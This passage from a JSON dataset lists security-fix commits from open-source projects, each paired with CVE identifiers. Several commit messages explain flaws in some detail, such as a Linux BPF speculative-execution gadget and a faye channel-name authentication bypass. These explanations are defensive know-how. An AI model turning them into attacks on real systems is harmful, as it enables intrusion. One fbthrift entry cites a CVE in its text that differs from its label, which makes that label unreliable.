    ],
    "cveIdsCount": 1
  },
  "d5b8f249677947c0ce5890ab292542fa9623d6b16a285626e95253482d5d34c8": {
    "url": "https://github.com/facebook/wangle/commit/5b3bceca875e4ea4ed9d14c20b20ce46c92c13c6",
    "title": "Peek for \\n in LineBasedFrameDecoder.",
    "body": "Summary:Previously this could underflow if there was not a following \\n.CVE-2019-3563Reviewed By: siyengarDifferential Revision: D14935715fbshipit-source-id: 25c3eecf373f89efa1232456aeeb092f13b7fa06",
    "cveIds": [
      "CVE-2019-3563"
    ],
    "cveIdsCount": 1
  },
  "5bb4a70382c7f2bded1813e4f0ddb5fdd70d3e176b309ecc7e1fb133d4c977cc": {
    "url": "https://github.com/facebook/fbthrift/commit/c461c1bd1a3e130b181aa9c854da3030cd4b5156",
    "title": "Properly error when asked to skip an unknown field type",
    "body": "Summary:We weren't returning an error when asked to skip over a field with andunknown type. In this particular test case the code attempts to skipover a map with a large number of fields of unknown type and the ~3Bnoop calls take almost 30s. A misbehaving client could DoS a serverby sending short messages that take a long time to parse. There mayhave been other failure modes as well.The test covers the binary protocol because that is where the issuewas found. However, the issue is common to all protocols.This fixes CVE-2019-3552.Reviewed By: spalamarchukDifferential Revision: D14088980fbshipit-source-id: 8a9d63260db717347217a8d2ac883c4ce331d964",
    "cveIds": [
      "CVE-2019-3564"
    ],
    "cveIdsCount": 1
  },
  "f5357339f4e92cc84e52930109d4fed485070cf861a5b52980c74dcd06d1acd8": {
    "url": "https://github.com/facebook/fbthrift/commit/01686e15ec77ccb4d49a77d5bce3a01601e54d64",
    "title": "Throw on skipping an invalid type.",
    "body": "Summary:Certain values (e.g.) T_STOP should not appear as a skip type. Allowing them tocan cause thrift to loop unboundedly.Reviewed By: spalamarchukDifferential Revision: D15102451fbshipit-source-id: c08d52f44f37e9c212d3480233ac217105586c9f",
    "cveIds": [
      "CVE-2019-3565"
    ],
    "cveIdsCount": 1
  },
  "87765dfb5f26931c824d44a8da6a725823bfb870f55d55187fe2d45a0a5ae10c": {
    "url": "https://github.com/facebook/hhvm/commit/97ef580ec2cca9a54da6f9bd9fdd9a455f6d74ed",
    "title": "Fix default FastCGI interface",
    "body": "Reviewed By: alexeytDifferential Revision: D15567393fbshipit-source-id: ffab228f689d4ddca9ea4835c70aecf16da2aa9f",
    "cveIds": [
      "CVE-2019-3569"
    ],
    "cveIdsCount": 1
  },
  "8aef70842db7780ca4adfe77a803864109bf517ad77e3792cd537682969e9a0f": {
    "url": "https://github.com/facebook/hhvm/commit/cc331e4349e91706a673e2a09f1f2ea5bbb33815",
    "title": "Replace copied scrypt implementation with call to libsodium",
    "body": "Summary:libsodium actually uses the same implementation; using libsodium means we don'tneed to maintain a copy ourselves.Keep the `pickparams` implementation though, as that's not exposed in libsodium.We should deprecate this extension, and strongly encourage directly using `ext_sodium` instead from Hack code; stored hashes from `ext_scrypt` can be verified like this:```$enc = scrypt_enc('foo', random_bytes(SODIUM_CRYPTO_PWHASH_SCRYPTSALSA208SHA256_SALTBYTES));​​list($_, $algo, $n, $r, $p, $salt, $out) = explode('$', $enc);​invariant($algo === 's', 'did not get an scrypt result');​$salt = base64_decode($salt);​$out = base64_decode($out);​​$opslimit = (1 << $n) * $r * $p * 4;​$memlimit = (1 << $n) * $r * 128;​$sodium = sodium_crypto_pwhash_scryptsalsa208sha256(strlen($out), 'foo', $salt, $opslimit, $memlimit);​\\var_dump($sodium === $out);```This also makes the scrypt extension depend on libsodium; this is fine, libsodium's going to be a hard dependency for HHVM anyway when the proxygen pin is next updated.Reviewed By: alexeytDifferential Revision: D15702142fbshipit-source-id: 2dcad7c6cb273d4ce4b3479ffa445841fa2d1107",
    "cveIds": [
      "CVE-2019-3570"
    ],
    "cveIdsCount": 1
  },
  "22734b3795bfd375ac3a56688f9b3945cc7963df466203ac7b40895e2b131fad": {
    "url": "https://github.com/cockpit-project/cockpit/commit/c51f6177576d7e12",
    "title": "ws: Fix bug parsing invalid base64 headers",
    "body": "The len parameter to g_base64_decode_inplace() is a inoutparameter, and needs to be initialized. Lets just usethe simpler g_base64_decode() function. This fixes a segfault.Closes #10819",
    "cveIds": [
      "CVE-2019-3804"
    ],
    "cveIdsCount": 1
  },
  "c8acb62cce18f256355ab2103998cb32e0ed0e72268c1a02606c6f717728cba3": {
    "url": "https://github.com/rpm-software-management/libcomps/commit/e3a5d056633677959ad924a51758876d415e7046",
    "title": "Fix UAF in comps_objmrtree_unite function",
    "body": "The added field is not used at all in many places and it is probably theleft-over of some copy-paste.",
    "cveIds": [
      "CVE-2019-3817"
    ],
    "cveIdsCount": 1
  },
  "a819c9cfc57bb648a692cd11d45ed372ecad9f7f767745eed8349c1195331edf": {
    "url": "https://github.com/prometheus/prometheus/commit/62e591f9",
    "title": "*: cut 2.7.1 (#5164)",
    "body": "Signed-off-by: Goutham Veeramachaneni <gouthamve@gmail.com>",
    "cveIds": [
      "CVE-2019-3826"
    ],
    "cveIdsCount": 1
  },
  "7e50178a817278136ff89727ebca83215e85bd035ee8a6c97ccf9db32cac05f6": {
    "url": "https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d",
    "title": "merge branch 'cve-2019-5736'",
    "body": "nsenter: clone /proc/self/exe to avoid exposing host binary to containerFixes: CVE-2019-5736LGTMs: @cyphar @crosbymichael",
    "cveIds": [
      "CVE-2019-5736"
    ],
    "cveIdsCount": 1
  },
  "d4f02fa5ad2e6cc47fc14fcc0160b2df026f42e3dc6afb5b00d29ceedffa1979": {
    "url": "https://github.com/opencontainers/runc/commit/0a8e4117e7f715d5fbeef398405813ce8e88558b",
    "title": "nsenter: clone /proc/self/exe to avoid exposing host binary to container",
    "body": "There are quite a few circumstances where /proc/self/exe pointing to apretty important container binary is a _bad_ thing, so to avoid this wehave to make a copy (preferably doing self-clean-up and not beingwriteable).We require memfd_create(2) -- though there is an O_TMPFILE fallback --but we can always extend this to use a scratch MNT_DETACH overlayfs ortmpfs. The main downside to this approach is no page-cache sharing forthe runc binary (which overlayfs would give us) but this is far lesscomplicated.This is only done during nsenter so that it happens transparently to theGo code, and any libcontainer users benefit from it. This also makesExtraFiles and --preserve-fds handling trivial (because we don't need toworry about it).Fixes: CVE-2019-5736Co-developed-by: Christian Brauner <christian.brauner@ubuntu.com>Signed-off-by: Aleksa Sarai <asarai@suse.de>",
    "cveIds": [
      "CVE-2019-5736"
    ],
    "cveIdsCount": 1
  },
  "b871b8ee17ed8c37dfa9f791a4fc480a33a930945fb59b8d72b21fa1bfde5424": {
    "url": "https://github.com/Studio-42/elFinder/commit/f133163f2d754584de65d718b2fde96191557316",
    "title": "[php:core:security] fix information leakage vulnerability",
    "body": "elFinder <= 2.1.44 PHP connector has high severity securityvulnerability to information leakage. This vulnerability is affected onenvironments in which the curl extension of PHP is enabled and safe_modeor open_basedir is not set.To fix this vulnerability with this commit.We would like to express our special thanks to Ravindra Rajaram(ravindra.rajaram@broadcom.com) and Hamsalekha Madiraju(hamsalekha.madiraju@broadcom.com) who reported this vulnerability.",
    "cveIds": [
      "CVE-2019-5884"
    ],
    "cveIdsCount": 1
  },
  "1ee70f35f0271e494cda6888e5304ef37a2721ddaec6ddf8d605d5ca20777e71": {
    "url": "https://github.com/torvalds/linux/commit/d3bd7413e0ca40b60cf60d4003246d067cafdeda",
    "title": "bpf: fix sanitation of alu op with pointer / scalar type from differe…",
    "body": "…nt pathsWhile 979d63d (\"bpf: prevent out of bounds speculation on pointerarithmetic\") took care of rejecting alu op on pointer when e.g. pointercame from two different map values with different map properties such asvalue size, Jann reported that a case was not covered yet when a givenalu op is used in both \"ptr_reg += reg\" and \"numeric_reg += reg\" fromdifferent branches where we would incorrectly try to sanitize basedon the pointer's limit. Catch this corner case and reject the programinstead.Fixes: 979d63d (\"bpf: prevent out of bounds speculation on pointer arithmetic\")Reported-by: Jann Horn <jannh@google.com>Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>Acked-by: Alexei Starovoitov <ast@kernel.org>Signed-off-by: Alexei Starovoitov <ast@kernel.org>",
    "cveIds": [
      "CVE-2019-7308"
    ],
    "cveIdsCount": 1
  },
  "9254c6a0e1093dd8311c012b1f59817aea7dbdee470b3fd76300ed7d62e6912a": {
    "url": "https://github.com/torvalds/linux/commit/979d63d50c0c0f7bc537bf821e056cc9fe5abd38",
    "title": "bpf: prevent out of bounds speculation on pointer arithmetic",
    "body": "Jann reported that the original commit back in b215739(\"bpf: prevent out-of-bounds speculation\") was not sufficientto stop CPU from speculating out of bounds memory access:While b215739 only focussed on masking array map accessfor unprivileged users for tail calls and data access suchthat the user provided index gets sanitized from BPF programand syscall side, there is still a more generic form affectedfrom BPF programs that applies to most maps that hold userdata in relation to dynamic map access when dealing withunknown scalars or \"slow\" known scalars as access offset, forexample: - Load a map value pointer into R6 - Load an index into R7 - Do a slow computation (e.g. with a memory dependency) that loads a limit into R8 (e.g. load the limit from a map for high latency, then mask it to make the verifier happy) - Exit if R7 >= R8 (mispredicted branch) - Load R0 = R6[R7] - Load R0 = R6[R0]For unknown scalars there are two options in the BPF verifierwhere we could derive knowledge from in order to guaranteesafe access to the memory: i) While </>/<=/>= variants won'tallow to derive any lower or upper bounds from the unknownscalar where it would be safe to add it to the map valuepointer, it is possible through ==/!= test however. ii) anotheroption is to transform the unknown scalar into a known scalar,for example, through ALU ops combination such as R &= <imm>followed by R |= <imm> or any similar combination where theoriginal information from the unknown scalar would be destroyedentirely leaving R with a constant. The initial slow load stillprecedes the latter ALU ops on that register, so the CPUexecutes speculatively from that point. Once we have the knownscalar, any compare operation would work then. A third optiononly involving registers with known scalars could be craftedas described in [0] where a CPU port (e.g. Slow Int unit)would be filled with many dependent computations such thatthe subsequent condition depending on its outcome has to waitfor evaluation on its execution port and thereby executingspeculatively if the speculated code can be scheduled on adifferent execution port, or any other form of mistrainingas described in [1], for example. Given this is not limitedto only unknown scalars, not only map but also stack accessis affected since both is accessible for unprivileged usersand could potentially be used for out of bounds access underspeculation.In order to prevent any of these cases, the verifier is nowsanitizing pointer arithmetic on the offset such that anyout of bounds speculation would be masked in a way where thepointer arithmetic result in the destination register willstay unchanged, meaning offset masked into zero similar asin array_index_nospec() case. With regards to implementation,there are three options that were considered: i) new insnfor sanitation, ii) push/pop insn and sanitation as inlinedBPF, iii) reuse of ax register and sanitation as inlined BPF.Option i) has the downside that we end up using from reservedbits in the opcode space, but also that we would requireeach JIT to emit masking as native arch opcodes meaningmitigation would have slow adoption till everyone implementsit eventually which is counter-productive. Option ii) and iii)have both in common that a temporary register is needed inorder to implement the sanitation as inlined BPF since weare not allowed to modify the source register. While a push /pop insn in ii) would be useful to have in any case, itrequires once again that every JIT needs to implement itfirst. While possible, amount of changes needed would alsobe unsuitable for a -stable patch. Therefore, the path whichhas fewer changes, less BPF instructions for the mitigationand does not require anything to be changed in the JITs isoption iii) which this work is pursuing. The ax register isalready mapped to a register in all JITs (modulo arm32 whereit's mapped to stack as various other BPF registers there)and used in constant blinding for JITs-only so far. It canbe reused for verifier rewrites under certain constraints.The interpreter's tmp \"register\" has therefore been remappedinto extending the register set with hidden ax register andreusing that for a number of instructions that needed theprior temporary variable internally (e.g. div, mod). Thisallows for zero increase in stack space usage in the interpreter,and enables (restricted) generic use in rewrites otherwise aslong as such a patchlet does not make use of these instructions.The sanitation mask is dynamic and relative to the offset themap value or stack pointer currently holds.There are various cases that need to be taken under considerationfor the masking, e.g. such operation could look as follows:ptr += val or val += ptr or ptr -= val. Thus, the value to besanitized could reside either in source or in destinationregister, and the limit is different depending on whetherthe ALU op is addition or subtraction and depending on thecurrent known and bounded offset. The limit is derived asfollows: limit := max_value_size - (smin_value + off). Forsubtraction: limit := umax_value + off. This holds becausewe do not allow any pointer arithmetic that wouldtemporarily go out of bounds or would have an unknownvalue with mixed signed bounds where it is unclear atverification time whether the actual runtime value wouldbe either negative or positive. For example, we have aderived map pointer value with constant offset and boundedone, so limit based on smin_value works because the verifierrequires that statically analyzed arithmetic on the pointermust be in bounds, and thus it checks if resultingsmin_value + off and umax_value + off is still within mapvalue bounds at time of arithmetic in addition to time ofaccess. Similarly, for the case of stack access we derivethe limit as follows: MAX_BPF_STACK + off for subtractionand -off for the case of addition where off := ptr_reg->off +ptr_reg->var_off.value. Subtraction is a special case forthe masking which can be in form of ptr += -val, ptr -= -val,or ptr -= val. In the first two cases where we know thatthe value is negative, we need to temporarily negate thevalue in order to do the sanitation on a positive valuewhere we later swap the ALU op, and restore original sourceregister if the value was in source.The sanitation of pointer arithmetic alone is still not fullysufficient as is, since a scenario like the following couldhappen ... PTR += 0x1000 (e.g. K-based imm) PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON PTR += 0x1000 PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON [...]... which under speculation could end up as ... PTR += 0x1000 PTR -= 0 [ truncated by mitigation ] PTR += 0x1000 PTR -= 0 [ truncated by mitigation ] [...]... and therefore still access out of bounds. To prevent suchcase, the verifier is also analyzing safety for potential outof bounds access under speculative execution. Meaning, it isalso simulating pointer access under truncation. We therefore\"branch off\" and push the current verification state after theALU operation with known 0 to the verification stack for lateranalysis. Given the current path analysis succeeded it islikely that the one under speculation can be pruned. In anycase, it is also subject to existing complexity limits andtherefore anything beyond this point will be rejected. Interms of pruning, it needs to be ensured that the verificationstate from speculative execution simulation must never prunea non-speculative execution path, therefore, we mark verifierstate accordingly at the time of push_stack(). If verifierdetects out of bounds access under speculative execution fromone of the possible paths that includes a truncation, it willreject such program.Given we mask every reg-based pointer arithmetic forunprivileged programs, we've been looking into how it couldaffect real-world programs in terms of size increase. As themajority of programs are targeted for privileged-only usecase, we've unconditionally enabled masking (with its alurestrictions on top of it) for privileged programs for thesake of testing in order to check i) whether they get rejectedin its current form, and ii) by how much the number ofinstructions and size will increase. We've tested this byusing Katran, Cilium and test_l4lb from the kernel selftests.For Katran we've evaluated balancer_kern.o, Cilium bpf_lxc.oand an older test object bpf_lxc_opt_-DUNKNOWN.o and l4lbwe've used test_l4lb.o as well as test_l4lb_noinline.o. Wefound that none of the programs got rejected by the verifierwith this change, and that impact is rather minimal to none.balancer_kern.o had 13,904 bytes (1,738 insns) xlated and7,797 bytes JITed before and after the change. Most complexprogram in bpf_lxc.o had 30,544 bytes (3,817 insns) xlatedand 18,538 bytes JITed before and after and none of the othertail call programs in bpf_lxc.o had any changes either. Forthe older bpf_lxc_opt_-DUNKNOWN.o object we found a smallincrease from 20,616 bytes (2,576 insns) and 12,536 bytes JITedbefore to 20,664 bytes (2,582 insns) and 12,558 bytes JITedafter the change. Other programs from that object file hadsimilar small increase. Both test_l4lb.o had no change andremained at 6,544 bytes (817 insns) xlated and 3,401 bytesJITed and for test_l4lb_noinline.o constant at 5,080 bytes(634 insns) xlated and 3,313 bytes JITed. This can be explainedin that LLVM typically optimizes stack based pointer arithmeticby using K-based operations and that use of dynamic map accessis not overly frequent. However, in future we may decide tooptimize the algorithm further under known guarantees frombranch and value speculation. Latter seems also unclear interms of prediction heuristics that today's CPUs apply as wellas whether there could be collisions in e.g. the predictor'sValue History/Pattern Table for triggering out of bounds access,thus masking is performed unconditionally at this point but couldbe subject to relaxation later on. We were generally alsobrainstorming various other approaches for mitigation, but theblocker was always lack of available registers at runtime and/oroverhead for runtime tracking of limits belonging to a specificpointer. Thus, we found this to be minimally intrusive undergiven constraints.With that in place, a simple example with sanitized access onunprivileged load at post-verification time looks as follows: # bpftool prog dump xlated id 282 [...] 28: (79) r1 = *(u64 *)(r7 +0) 29: (79) r2 = *(u64 *)(r7 +8) 30: (57) r1 &= 15 31: (79) r3 = *(u64 *)(r0 +4608) 32: (57) r3 &= 1 33: (47) r3 |= 1 34: (2d) if r2 > r3 goto pc+19 35: (b4) (u32) r11 = (u32) 20479 | 36: (1f) r11 -= r2 | Dynamic sanitation for pointer 37: (4f) r11 |= r2 | arithmetic with registers 38: (87) r11 = -r11 | containing bounded or known 39: (c7) r11 s>>= 63 | scalars in order to prevent 40: (5f) r11 &= r2 | out of bounds speculation. 41: (0f) r4 += r11 | 42: (71) r4 = *(u8 *)(r4 +0) 43: (6f) r4 <<= r1 [...]For the case where the scalar sits in the destination registeras opposed to the source register, the following code is emittedfor the above example: [...] 16: (b4) (u32) r11 = (u32) 20479 17: (1f) r11 -= r2 18: (4f) r11 |= r2 19: (87) r11 = -r11 20: (c7) r11 s>>= 63 21: (5f) r2 &= r11 22: (0f) r2 += r0 23: (61) r0 = *(u32 *)(r2 +0) [...]JIT blinding example with non-conflicting use of r10: [...] d5:je 0x0000000000000106 _ d7:mov 0x0(%rax),%edi | da:mov $0xf153246,%r10d | Index load from map value and e0:xor $0xf153259,%r10 | (const blinded) mask with 0x1f. e7:and %r10,%rdi |_ ea:mov $0x2f,%r10d | f0:sub %rdi,%r10 | Sanitized addition. Both use r10 f3:or %rdi,%r10 | but do not interfere with each f6:neg %r10 | other. (Neither do these instructions f9:sar $0x3f,%r10 | interfere with the use of ax as temp fd:and %r10,%rdi | in interpreter.) 100:add %rax,%rdi |_ 103:mov 0x0(%rdi),%eax [...]Tested that it fixes Jann's reproducer, and also checked that test_verifierand test_progs suite with interpreter, JIT and JIT with hardening enabledon x86-64 and arm64 runs successfully. [0] Speculose: Analyzing the Security Implications of Speculative Execution in CPUs, Giorgi Maisuradze and Christian Rossow, https://arxiv.org/pdf/1801.04084.pdf [1] A Systematic Evaluation of Transient Execution Attacks and Defenses, Claudio Canella, Jo Van Bulck, Michael Schwarz, Moritz Lipp, Benjamin von Berg, Philipp Ortner, Frank Piessens, Dmitry Evtyushkin, Daniel Gruss, https://arxiv.org/pdf/1811.05441.pdfFixes: b215739 (\"bpf: prevent out-of-bounds speculation\")Reported-by: Jann Horn <jannh@google.com>Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>Acked-by: Alexei Starovoitov <ast@kernel.org>Signed-off-by: Alexei Starovoitov <ast@kernel.org>",
    "cveIds": [
      "CVE-2019-7308"
    ],
    "cveIdsCount": 1
  },
  "c175c6aa4bc208053e3400f9939da3fa6f6e7a13365f9b12b2f0c8931c8b2b60": {
    "url": "https://github.com/nukeviet/nukeviet/pull/2740/commits/05dfb9b4531f12944fe39556f58449b9a56241be",
    "title": "fix security error",
    "body": "Thank Zepto Team, hungnguyenmz",
    "cveIds": [
      "CVE-2019-7726"
    ],
    "cveIdsCount": 1
  },
  "6b9667e340665e2cd22b0359cc072dd48831dabf749803186ef9a12f207f9749": {
    "url": "https://github.com/ory/hydra/commit/9b5bbd48a72096930af08402c5e07fce7dd770f3",
    "title": "oauth2: Use html templates in fallback endpoints (#1202)",
    "body": "Signed-off-by: aeneasr <aeneas@ory.sh>",
    "cveIds": [
      "CVE-2019-8400"
    ],
    "cveIdsCount": 1
  },
  "3ae5952d95125b88424ef7f4cc6bb2baa2499f42f0f0c716d07aeac59344d556": {
    "url": "https://github.com/perl/perl5/commit/3295b48defa0f8570114877b063fe546dd348b3c",
    "title": "regcomp: use long jumps if there is any possibility of overflow",
    "body": "(CVE-2020-10878) Be conservative for backporting, we'll aim to dosomething more aggressive for bleadperl.(cherry picked from commit 9d7759db46f3b31b1d3f79c44266b6ba42a47fc6)",
    "cveIds": [
      "CVE-2020-10878"
    ],
    "cveIdsCount": 1
  },
  "5f508bcde4559ef7f7895a8b7c395daf29afadb2090107c64091be43496c2da7": {
    "url": "https://github.com/perl/perl5/commit/0a320d753fe7fca03df259a4dfd8e641e51edaa8",
    "title": "study_chunk: extract rck_elide_nothing",
    "body": "(CVE-2020-10878)(cherry picked from commit 93dee06613d4e1428fb10905ce1c3c96f53113dc)",
    "cveIds": [
      "CVE-2020-10878"
    ],
    "cveIdsCount": 1
  },
  "15389be43abbe204317fae0760fd4df40ea333fd7e600240cfabaf926d652cbf": {
    "url": "https://github.com/wagtail/wagtail/commit/61045ceefea114c40ac4b680af58990dbe732389",
    "title": "Apply proper HTML escaping on StreamField block comparisons",
    "body": "An individual StreamField block in the comparison view may be rendered as a plain value (for blocks that are unchanged, added or deleted) or a diff (for blocks that are changed). In both cases, the output is returned as HTML, but must not contain any unescaped editor-supplied HTML.For CharBlock, TextBlock and RawHTMLBlock, the block value is escaped so that any HTML tags in the content are shown verbatim.For RichTextBlock and any other block types that do not override the default comparison behaviour, we take the basic (non-templated) HTML rendering of the block and extract text-only content from it. This is then returned in HTML-escaped form for the plain view, and run through diff_text().to_html() for the diff view (which handles escaping itself).",
    "cveIds": [
      "CVE-2020-11001"
    ],
    "cveIdsCount": 1
  },
  "cfd69650340695dd6fa1354bfd49f8e81cc1994bdde228093369f95cfd238a75": {
    "url": "https://github.com/shopizer-ecommerce/shopizer/commit/929ca0839a80c6f4dad087e0259089908787ad2a",
    "title": "Merge pull request from GHSA-w8rc-pgxq-x2cj",
    "body": "Fixing negative charge vulnerability",
    "cveIds": [
      "CVE-2020-11006",
      "CVE-2020-11007"
    ],
    "cveIdsCount": 2
  },
  "e33343c37649618f5ec36326c8187a812584c1f40604ed9236052244ae314ab0": {
    "url": "https://github.com/certtools/intelmq-manager/commit/b9a2ac43a4f99d764b827108f6a99dc4a9faa013",
    "title": "SEC: fix RCE bug in controller.php",
    "body": "@bernhard-herzog (@Intevation) discovered that the backend incorrectly handled messages given by user-input in the \"send\" functionality of the Inspect-tool of the Monitor component. An attacker with access to the IntelMQ Manager could possibly use this issue to execute arbitrary code with the privileges of the webserver.",
    "cveIds": [
      "CVE-2020-11016"
    ],
    "cveIdsCount": 1
  },
  "a2e29a61b8fe599588811576f7c5884d1663a02f464a05434d326d7d9fe0917a": {
    "url": "https://github.com/faye/faye/commit/65d297d341b607f3cb0b5fa6021a625a991cc30e",
    "title": "Strict meta channel recognition in server",
    "body": "This addresses a security vulnerability affecting user-added extensionsthat implement access control for channels. These extensions typicallywork by checking incoming messages whose channel is `/meta/subscribe`and then performing some authentication routine before allowing themessage through.However, the Server parses channels in a way that means any channelnamespaced under `/meta/subscribe` will also work as a subscriptionrequest. For example if the client sends a message to the channel`/meta/subscribe/x`, that will bypass most authentication extensions butwill still be interpreted by the server as a subscription request, andthe client will be subscribed to the requested channel. The client hasthus bypassed the user's access control policy.Here we prevent this by using a strict equality check; only messageswhose channel is exactly `/meta/subscribe` will be interpreted assubscription requests. The same pattern is applied to all other metachannels.",
    "cveIds": [
      "CVE-2020-11020"
    ],
    "cveIdsCount": 1
  },
  "7713c0a3a487cd3fd1088b6e83726134fb2e2c3fa286a1e27255b3118ab0aa7e": {
    "url": "https://github.com/actions/http-client/commit/f6aae3dda4f4c9dc0b49737b36007330f78fd53a",
    "title": "Merge pull request #27 from actions/redirect-auth-issue",
    "body": "Redirects should not pass authorization to different domain",
    "cveIds": [
      "CVE-2020-11021"
    ],
    "cveIdsCount": 1
  },
  "4c649af520ac7baabd34f1f3ab078e4f9ef54d185748473bb0f629392c5ddafa": {
    "url": "https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77",
    "title": "Manipulation: Make jQuery.htmlPrefilter an identity function",
    "body": "Closes gh-4642(cherry picked from 90fed4b)",
    "cveIds": [
      "CVE-2020-11022"
    ],
    "cveIdsCount": 1
  },
  "4766e955ab10057ceba56640c71044b2600d530dc02d2cd3ab06bf8e339ea0ff": {
    "url": "https://github.com/FreeRDP/FreeRDP/commit/c367f65d42e0d2e1ca248998175180aa9c2eacd0",
    "title": "Merge pull request #6019 from akallabeth/bound_access_fixes",
    "body": "Fix issues with boundary access.",
    "cveIds": [
      "CVE-2020-11049"
    ],
    "cveIdsCount": 1
  },
  "94108e0eb708b31a0d8a1bdfd97726dc09ea11802c8a5a8347f123d2841a16f4": {
    "url": "https://github.com/PrestaShop/PrestaShop/commit/d122b82bcc2ad8a7b05cfffc03df6c2cae08efe8",
    "title": "Merge pull request from GHSA-v4pg-q2cv-f7x4",
    "body": "Escape $confirm variable in smarty context",
    "cveIds": [
      "CVE-2020-11074"
    ],
    "cveIdsCount": 1
  },
  "0b1bbadcbc1a6b3a6820838732a047ad1c87e4fa277ba4a419e2df89ed338aee": {
    "url": "https://github.com/rainlab/blog-plugin/commit/6ae19a6e16ef3ba730692bc899851342c858bb94",
    "title": "Implement support for backend.allow_unsafe_markdown and improve suppo…",
    "body": "…rt for Swoole",
    "cveIds": [
      "CVE-2020-11083"
    ],
    "cveIdsCount": 1
  },
  "d86f64e5f9346a0c8acc5797881a298f8af9135f4b64b19c5c44a95f3c426a82": {
    "url": "https://github.com/FreeRDP/FreeRDP/commit/733ee3208306b1ea32697b356c0215180fc3f049",
    "title": "Fixed invalid access in update_recv_primary_order",
    "body": "CVE-2020-11095 thanks @antonio-morales for finding this.",
    "cveIds": [
      "CVE-2020-11095"
    ],
    "cveIdsCount": 1
  },
  "84dc7811f2a050e84b401c27d8bd6fa4a059f8fd15337f82deb765150c3d1680": {
    "url": "https://github.com/FreeRDP/FreeRDP/commit/b8beb55913471952f92770c90c372139d78c16c0",
    "title": "Fixed OOB read in update_read_cache_bitmap_v3_order",
    "body": "CVE-2020-11096 thanks @antonio-morales for finding this.",
    "cveIds": [
      "CVE-2020-11096"
    ],
    "cveIdsCount": 1
  },
  "6d3f3f7387006857d5c77f53baaf23f0ce6c3b9153e9316d3613378e2f7298a0": {
    "url": "https://github.com/FreeRDP/FreeRDP/commit/58a3122250d54de3a944c487776bcd4d1da4721e",
    "title": "Fixed OOB read in ntlm_av_pair_get",
    "body": "CVE-2020-11097 thanks to @antonio-morales for finding this.",
    "cveIds": [
      "CVE-2020-11097"
    ],
    "cveIdsCount": 1
  },
  "92b9a980d0b6c4d04dd04370e314e1d111aff00a63d12d8efc140c057bef9545": {
    "url": "https://github.com/FreeRDP/FreeRDP/commit/c0fd449ec0870b050d350d6d844b1ea6dad4bc7d",
    "title": "Fixed Out-of-bound read in glyph_cache_put",
    "body": "CVE-2020-11098 thanks to @antonio-morales for finding this.",
    "cveIds": [
      "CVE-2020-11098"
    ],
    "cveIdsCount": 1
  },
  "f96d664da03534045e04b832b60b0fc336289fd4c1deea4a67cda955b10850c9": {
    "url": "https://github.com/FreeRDP/FreeRDP/commit/6ade7b4cbfd71c54b3d724e8f2d6ac76a58e879a",
    "title": "Fixed OOB Read in license_read_new_or_upgrade_license_packet",
    "body": "CVE-2020-11099 thanks to @antonio-morales for finding this.",
    "cveIds": [
      "CVE-2020-11099"
    ],
    "cveIdsCount": 1
  },
  "2a80d0030a1bac6b7c7c94263ff25a12adc3fcfcf46f7150af43d8b5fda582f8": {
    "url": "https://github.com/LimeSurvey/LimeSurvey/commit/daf50ebb16574badfb7ae0b8526ddc5871378f1b",
    "title": "Fixed issue [security] #16018: Path Traversal Vulnerability (Matthew …",
    "body": "…Aberegg, Michael Burkey)",
    "cveIds": [
      "CVE-2020-11455"
    ],
    "cveIdsCount": 1
  },
  "0726f0310e1a27bb8d40d40c6e86f976c4845ce54a92d00f247e9c872b7327f3": {
    "url": "https://github.com/LimeSurvey/LimeSurvey/commit/04b118acce2a74306f365ef329cbe00efc399b26",
    "title": "Fixed issue [security] #16019: Stored XSS in survey groups. (Thanks t…",
    "body": "…o Matthew Aberegg and Michael Burkey)Dev: admin view to be fixedDev: not shown in public : no need XSS filtering",
    "cveIds": [
      "CVE-2020-11456"
    ],
    "cveIdsCount": 1
  },
  "beaf27fdbf1159b7f33e967c102c14c3b6161113ef0f20c51cfebc2534f96fb2": {
    "url": "https://github.com/MISP/MISP/commit/30ff4b6451549dae7b526d4fb3a49061311ed477",
    "title": "chg: [security] Added setting to restrict the encoding of local feeds",
    "body": "- By adding local feeds, a malicious administrator could point MISP to ingest configuration files that the apache user has access to- This includes some more sensitive files (database.php / config.php / .gnupg data)- Whilst this is currently not leading to an exploitable vulnerability as the current implementation wouldn't trigger on the values, having a setting to disable this will become much more interesting once we have a system in place for custom feed parsers- The setting can only be enabled/disabled via the CLI- As reported by Matthias Weckbecker",
    "cveIds": [
      "CVE-2020-11458"
    ],
    "cveIdsCount": 1
  },
  "123fa318ab6a85ea173ff774e2be842bb1fa39a54d9b6d92a77bd4d1be25f080": {
    "url": "https://github.com/torvalds/linux/commit/b9258a2cece4ec1f020715fe3554bc2e360f6264",
    "title": "slcan: Don't transmit uninitialized stack data in padding",
    "body": "struct can_frame contains some padding which is not explicitly zeroed inslc_bump. This uninitialized data will then be transmitted if the stackinitialization hardening feature is not enabled (CONFIG_INIT_STACK_ALL).This commit just zeroes the whole struct including the padding.Signed-off-by: Richard Palethorpe <rpalethorpe@suse.com>Fixes: a1044e3 (\"can: add slcan driver for serial/USB-serial CAN adapters\")Reviewed-by: Kees Cook <keescook@chromium.org>Cc: linux-can@vger.kernel.orgCc: netdev@vger.kernel.orgCc: security@kernel.orgCc: wg@grandegger.comCc: mkl@pengutronix.deCc: davem@davemloft.netAcked-by: Marc Kleine-Budde <mkl@pengutronix.de>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2020-11494"
    ],
    "cveIdsCount": 1
  },
  "496a946009e0aeb7699fed431524cf3997301e877a6aa64572a2aaa82347750c": {
    "url": "https://github.com/torvalds/linux/commit/aa9f7d5172fac9bf1f09e678c35e287a40a7b7dd",
    "title": "mm: mempolicy: require at least one nodeid for MPOL_PREFERRED",
